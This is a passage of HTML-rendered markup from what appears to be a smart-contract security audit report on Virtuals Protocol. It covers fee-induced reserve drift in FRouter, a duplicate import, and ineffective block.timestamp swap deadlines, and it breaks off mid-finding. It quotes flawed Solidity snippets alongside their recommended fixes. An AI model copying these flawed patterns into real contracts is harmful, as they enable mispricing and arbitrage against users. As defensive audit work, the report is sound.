\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only admin can transfer admin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;New admin cannot be zero address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit event for the pending transfer\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eacceptAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only pending admin can accept role\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit event for the completed transfer\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis pattern ensures that admin rights are only transferred to a valid and responsive address, reducing the risk of accidental or permanent loss of control.\u003c/p\u003e\n\u003ch2 id=\"05-fee-induced-reserve-inconsistency-in-frouter\" style=\"position:relative;\"\u003e\u003ca href=\"#05-fee-induced-reserve-inconsistency-in-frouter\" aria-label=\"05 fee induced reserve inconsistency in frouter permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[05] Fee-induced reserve inconsistency in \u003ccode\u003eFRouter\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eIn the \u003ccode\u003eFRouter\u003c/code\u003e contract, swap fees are deducted from the output amount after the swap amount is calculated using the reserves, but these fees are not accounted for in the reserve updates. This creates a discrepancy between the protocol’s internal reserve accounting and the actual token balances held by the pair contract after each trade.\u003c/p\u003e\n\u003ch3 id=\"root-cause-1\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause-1\" aria-label=\"root cause 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot cause\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe router calculates the swap output using the reserves and then deducts the fee from the output amount, transferring the fee separately to the tax vault.\u003c/li\u003e\n\u003cli\u003eHowever, the pair contract’s reserves are updated based on the pre-fee output, not the net output actually received by the user.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FRouter.sol#L113-L124\"\u003eFRouter.sol#L113-L124\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-19\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-19\" aria-label=\"impact 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe reserves recorded by the pair contract may diverge from the actual token balances after repeated trades, leading to inaccurate price calculations and potential arbitrage opportunities.\u003c/li\u003e\n\u003cli\u003eOver time, this could degrade the integrity of the AMM’s pricing and reserve logic, especially if fees are significant or trading volume is high.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo maintain reserve consistency, fees should be deducted before calculating the swap output and updating reserves. This ensures that the reserves always match the actual balances and reflect the true state of the pool. For example, the fee can be incorporated into the amount calculation or deducted from the input before calling the swap, so that the pair’s reserve update logic remains accurate.\u003c/p\u003e\n\u003ch2 id=\"06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol\" style=\"position:relative;\"\u003e\u003ca href=\"#06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol\" aria-label=\"06 duplicate import statement for agentfactoryv3sol in fgenesissol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[06] Duplicate import statement for \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e in \u003ccode\u003eFGenesis.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eIn \u003ccode\u003eFGenesis.sol\u003c/code\u003e, the module \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e is imported twice at the top of the file:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis duplication is unnecessary and could lead to confusion for maintainers or reviewers. While it does not directly impact contract functionality or security, it is a code quality issue that can be easily avoided. Redundant imports may also introduce ambiguity if the file is refactored in the future or if conditional compilation is used.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-36\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-36\" aria-label=\"recommended mitigation steps 36 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the redundant import statement so that \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e is imported only once at the top of the contract file.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/genesis/FGenesis.sol#L8-L11\"\u003eFGenesis.sol#L8-L11\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"07-misconception-in-using-blocktimestamp--x-for-swap-deadlines\" style=\"position:relative;\"\u003e\u003ca href=\"#07-misconception-in-using-blocktimestamp--x-for-swap-deadlines\" aria-label=\"07 misconception in using blocktimestamp  x for swap deadlines permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[07] Misconception in using \u003ccode\u003eblock.timestamp + X\u003c/code\u003e for swap deadlines\u003c/h2\u003e\n\u003cp\u003eA common misconception in DeFi contracts is that setting a swap deadline as \u003ccode\u003eblock.timestamp + X\u003c/code\u003e (e.g., \u003ccode\u003eblock.timestamp + 5 minutes\u003c/code\u003e) ensures the transaction is only valid for a real-world time window after the user initiates it. This pattern is used in both \u003ccode\u003eUniswapV2Router02\u003c/code\u003e and \u003ccode\u003eAgentTax.sol\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/tax/AgentTax.sol#L227-L228\"\u003eAgentTax.sol#L227-L228\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router02\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapExactETHForTokensSupportingFeeOnTransferTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e{value: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e}(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminutes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// AgentTax.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountToSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e300\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, \u003ccode\u003eblock.timestamp\u003c/code\u003e reflects the timestamp of the block in which the transaction is included, not when it was submitted. As a result, if a transaction is submitted at time \u003ccode\u003eT0\u003c/code\u003e but only included in a block at \u003ccode\u003eT0 + 1 hour\u003c/code\u003e, the deadline will still be valid as long as the block’s timestamp is less than the deadline. This means the window is relative to block inclusion, not user intent.\u003c/p\u003e\n\u003ch3 id=\"impact-20\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-20\" aria-label=\"impact 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 